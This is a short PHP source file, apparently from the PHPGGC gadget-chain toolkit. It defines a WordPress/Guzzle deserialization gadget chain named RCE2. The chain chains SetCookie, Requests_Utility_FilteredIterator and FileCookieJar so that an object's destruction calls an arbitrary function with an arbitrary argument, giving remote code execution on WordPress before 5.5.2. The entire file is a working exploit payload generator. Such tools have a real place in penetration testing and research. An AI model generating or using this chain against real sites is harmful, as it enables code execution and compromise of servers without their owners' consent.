<?php

namespace GadgetChain\WordPress\Guzzle;

class RCE2 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '4.0.0 <= 6.4.1+ & WP < 5.5.2';
    public static $vector = '__destruct';
    public static $author = 'Kevinlpd';
    public static $information = 'Tested up to WP 5.2.4 and Guzzle 6.4.1. Newest versions might also work.';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        $g = new \GuzzleHttp\Cookie\SetCookie(
            new \Requests_Utility_FilteredIterator(['Name' => $parameter, 'Value' => ''], $function)
        );

        return new \GuzzleHttp\Cookie\FileCookieJar($g);
    }
}